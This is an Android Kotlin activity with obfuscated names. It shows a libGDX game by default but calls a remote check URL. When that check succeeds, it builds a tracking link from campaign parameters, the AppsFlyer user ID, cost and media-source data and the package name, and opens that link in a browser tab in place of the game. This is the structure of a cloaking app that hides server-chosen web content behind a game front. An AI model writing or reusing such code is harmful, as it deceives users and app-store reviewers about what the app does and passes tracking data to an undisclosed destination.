package italodisco.fernando.lucherano

import android.content.pm.ActivityInfo
import android.net.Uri
import android.os.Bundle
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import italodisco.fernando.lucherano.databinding.ActivityMainBinding
import italodisco.fernando.lucherano.iopartew.sandes.FraoEngel
import italodisco.fernando.lucherano.iopartew.sandes.internetConnection
import italodisco.fernando.lucherano.iopartew.sandes.pistro.log
import italodisco.fernando.lucherano.pistorNaD.DSM
import italodisco.fernando.lucherano.pistorNaD.SaLkouTeRano
import italodisco.fernando.lucherano.pistorNaD.ladsro.Lottie
import italodisco.fernando.lucherano.pistorNaD.ladsro.Once
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.IOException
import kotlin.system.exitProcess

class JopaStarTue : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val Jeko = 1000

        val poloraDo = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var webURL              = "https://www.google.com/"
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

     lateinit var binding      : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie

    val okHttpClient     = OkHttpClient()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            coroutine.launch(Dispatchers.IO) {

            FraoEngel.Sarancha.checkDataStore(this@JopaStarTue)

                launch(Dispatchers.Main) {
                    poloraDo.collect { fragmentId ->
                        when (fragmentId) {
                            R.id.libGDXFragment -> {


                                setNavigationBarColor(R.color.black)
                                setStartDestination(fragmentId)
                                ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                            }

                            Jeko                -> {

                                val intent = CustomTabsIntent.Builder().build()

                                intent.launchUrl(this@JopaStarTue, Uri.parse(webURL))

                                setNavigationBarColor(R.color.white)
                                ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                            }

                            else                -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }.also { requestedOrientation = it }
                    }
                }
            }
        }
    }

    private fun generateAndOpenLink(key: String, target: String) {
        coroutine.launch(Dispatchers.IO) {
            val completerFlow = MutableSharedFlow<Unit>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)

            launch {
                SaLkouTeRano.initialize(this@JopaStarTue, key)
                SaLkouTeRano.checkFlow.collect { completerFlow.tryEmit(Unit) }
            }

            var counter = 0
            completerFlow.collect { if (++counter == 1) {
                val fullLink = target.plus("?") +
                        "sub1=".plus(SaLkouTeRano.campaignSubMap["sub1"].toString()).plus("&") +
                        "sub2=".plus(SaLkouTeRano.campaignSubMap["sub2"].toString()).plus("&") +
                        "sub3=".plus(SaLkouTeRano.campaignSubMap["sub3"].toString()).plus("&") +
                        "sub4=".plus(SaLkouTeRano.campaignSubMap["sub4"].toString()).plus("&") +
                        "sub5=".plus(SaLkouTeRano.campaignSubMap["sub5"].toString()).plus("&") +
                        "sub6=".plus(SaLkouTeRano.campaignSubMap["sub6"].toString()).plus("&") +
                        "sub_id_8=" .plus(AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)).plus("&") +
                        "sub_id_9=" .plus(SaLkouTeRano.dataMap["orig_cost"]     .toString()).plus("&") +
                        "sub_id_10=".plus(SaLkouTeRano.dataMap["cost_cents_USD"].toString()).plus("&") +
                        "sub_id_11=".plus(SaLkouTeRano.dataMap["media_source"]  .toString()).plus("&") +
                        "sub_id_12=".plus(appContext.packageName)

                log("full: $fullLink")

                webURL = fullLink
                poloraDo.tryEmit(Jeko)

                withContext(Dispatchers.IO) {
                    DSM.kliJ.update { "Poka" }
                    DSM.loDa.update { fullLink }
                }
            } }
        }
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }


    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)

    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@JopaStarTue, colorId)
        }
    }





     fun getResponseFromServer(linkCheck: String, key: String, link: String) {
        val request: Request = Request.Builder().url(linkCheck).build()

        try {
            okHttpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    log("getResponseFromServer SUCCESS code = ${response.code}")
                    generateAndOpenLink(key, link)
                } else {
                    log("getResponseFromServer newCall FAIL: ${response.code} ${response.message}")
                    poloraDo.tryEmit(R.id.libGDXFragment)
                }
            }
        } catch (e: IOException) {
            log("getResponseFromServer FAIL: $e")
            poloraDo.tryEmit(R.id.libGDXFragment)
        }
    }



}